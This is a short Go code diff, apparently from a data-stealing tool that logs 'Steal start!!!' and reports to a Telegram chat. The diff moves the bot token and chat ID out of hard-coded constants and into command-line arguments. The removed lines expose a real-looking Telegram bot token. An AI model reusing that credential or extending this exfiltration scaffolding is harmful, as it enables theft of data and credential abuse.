@@ -5,17 +5,15 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"strings"
 
 	log "github.com/sirupsen/logrus"
 )
 
 var (
-	logger *log.Logger
-)
-
-const (
-	botToken = "557749690:AAG2KmWVvOl03My9ia40T1MKAQiBCXFTd40"
-	chatID   = "-278847856"
+	logger   *log.Logger
+	botToken string
+	chatID   string
 )
 
 func init() {
@@ -36,6 +34,17 @@ func init() {
 	}
 	logger.SetLevel(log.InfoLevel)
 	logger.Info("Steal start!!!")
+
+	for _, val := range os.Args {
+		arg := strings.Split(val, "=")
+		if len(arg) < 2 {
+			continue
+		} else if arg[0] == "-apikey" {
+			botToken = arg[1]
+		} else if arg[0] == "-chatid" {
+			chatID = arg[1]
+		}
+	}
 }
 
 func sendTelegramMsg(msg string) {
